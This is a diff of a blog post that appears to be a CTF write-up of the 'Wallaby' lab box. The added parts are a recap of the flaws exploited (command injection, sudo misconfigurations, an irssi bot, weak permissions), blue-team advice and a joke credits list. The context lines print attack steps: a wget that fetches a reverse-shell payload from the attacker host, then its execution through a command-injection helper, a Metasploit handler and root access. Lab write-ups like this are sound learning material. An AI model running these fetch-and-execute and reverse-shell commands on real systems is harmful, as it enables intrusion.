@@ -45,7 +45,6 @@ Again, the first step is enumeration.
 Let's get into it with nmap:
 
 {{< highlight markdown >}}
-
 msf5 > db_nmap -sV -O -A  -T5 -Pn -p- target
 [*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 14:20 EDT
 [*] Nmap: Nmap scan report for target (192.168.167.133)
@@ -186,7 +185,6 @@ Start the CTF!
 So now I did the obvious thing and clicked "Start the CTF!"
 
 {{< highlight markdown >}}
-
 What the heck is this? Some guy named ctlfish is trying to penetrate my server? Loser must not know I'm the great Wallaby!
 Let's observe him for now, maybe I could learn about him from his behavior. 
 
@@ -516,7 +514,6 @@ After creating a payload, from the directory where your payload is, run
 Next, fetch the payload from yourself, and chmod it to make executable.
 
 {{< highlight markdown >}}
-
 ~/src/wallaby/pcurl.py -s -c 'wget 192.168.167.130:8000/revshell'
 ~/src/wallaby/pcurl.py -s -c 'chmod a+x revshell'
 
@@ -565,6 +562,7 @@ msf5 exploit(multi/handler) > run
 In another terminal, run the following command to remotely execute our staged payload.
 
 {{< highlight markdown >}}
+
 
 root@kali:~/wallaby# ~/src/wallaby/pcurl.py -s -c './revshell'  
 
@@ -642,7 +640,6 @@ Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
  * Support:        https://ubuntu.com/advantage
 Last login: Thu May  2 18:11:36 2019 from 192.168.167.130
 waldo@ubuntu:~$ 
-
 {{< / highlight >}}
 
 ## What Can Waldo Do?
@@ -777,5 +774,63 @@ Come to IRC and contact me if you find any errors or interesting ways to root, I
 Thanks guys!
 -Waldo
 root@ubuntu:~# 
-
 {{< / highlight >}}
+
+## Recap
+
+This box is exploitable through a series of flaws, some big, some small.
+
+1. PHP exploit via poorly written page which includes an tainted `system()` call
+2. sudo misconfiguration that allows the `www-data` user to run vim as `waldo`, and escape to a shell
+3. irssi bot weakness allows user `waldo` to run commands as `wallaby`
+4. bad permissions on user dirs in home (755 instead of 700)
+5. another sudo misconfiguration that allows `wallaby` to run anything without a password
+
+These flaws together are bigger than the sum of their parts. This box was a lot of fun for us and a great reminder why adhering to some classic UNIX/Linux best practices is important. Here's some key takeaways for when you are on the [blue team](https://danielmiessler.com/study/red-blue-purple-teams/):
+
+* Don't trust input - treat all user data as tainted. It should only execute prepared statements.
+* Weak permissions are dangerous
+* Configure sudo with great caution; a misconfiguration has terrible consequences
+
+<h1 align=center>CAST</h1>
+<p></p>
+<h2 align=center>Team Voltron</h2>
+<p><br /></p>
+<p align=center>
+Guiseppe as Himself<br />
+Matato as <a href="http://howdoilinux.com">Himself</a><br />
+SteveyDevey as <a href="http://newsted.net">Himself</a><br />
+CtlFish as <a href="https://blog.csuttles.io">Himself</a><br />
+Tommy as <a href="https://www.imdb.com/title/tt0368226/characters/nm1382072?ref_=tt_cl_t1">Johnny</a><br />
+</p>
+<p align=center>
+<b>Directed by Tommy Wiseau<br /><br />
+Written by Tommy Wiseau<br />
+    </b>
+    </p>
+<h3 align=center>Team Wiseau</h3>
+<br />
+<p align=center>
+Tommy Wiseau as Johnny<br />
+Juliette Danielle as Lisa<br />
+Greg Sestero as Mark<br />
+Philip Haldiman as Denny (as Phillip Haldiman)<br />
+Carolyn Minnott as Claudette (as Carolyn Minnot)<br />
+Robyn Paris as Michelle<br />
+Mike Holmes as Mike (as Mike Scott)<br />
+Dan Janjigian as Chris-R<br />
+Kyle Vogt as Peter<br />
+Greg Ellery as Steven<br />
+Piper Gore as Party Member # 1<br />
+Kari McDermott as Party Member # 2 (as Kari McDermont)<br />
+Jennifer Vanderbliek... Party Member # 3 (as Jen Vanderbliek)<br />
+Bennett Dunn as Party Member # 4 (as Bennet Dunn)<br />
+Padma Moyer as Susan<br />
+Daron Jennings as Barista # 2<br />
+Thomas E. Webster as Coffee Shop Customer # 1<br />
+Nora DeMarcky as Coffee Shop Customer # 2<br />
+Arelle Mitkowski as Coffee Shop Customer # 3<br />
+Frank Willey as Coffee Shop Customer # 4<br />
+Amy Von Brock as Party Member # 5 (uncredited)<br />
+</p>
+
